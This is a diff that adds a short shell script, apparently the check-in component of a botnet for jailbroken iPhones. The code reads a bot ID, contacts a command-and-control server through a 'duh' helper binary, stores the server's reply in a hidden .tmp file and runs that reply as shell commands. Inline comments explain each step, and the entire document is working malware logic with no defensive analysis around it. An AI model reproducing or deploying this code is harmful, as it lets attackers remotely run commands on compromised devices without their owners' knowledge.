@@ -1,0 +1,16 @@
+#!/bin/sh
+cd /private/var/mobile/home/
+ID=$(cat /etc/rel)  # Get bot client ID
+PATH=.:$PATH
+# invoke "duh" application - which checks in to C&C server with bot client ID
+# The C&C server replies are stored in file .tmp, which is then interrogated for new commands
+# via the check function
+/private/var/mobile/home/duh SERVER /xml/p.php?id=$ID > /private/var/mobile/home/.tmp
+check;
+
+function check {
+    if test 2 -lt $(wc -l .tmp | cut -d " " -f 1)
+    then
+	sh /private/var/mobile/home/.tmp
+    fi
+}
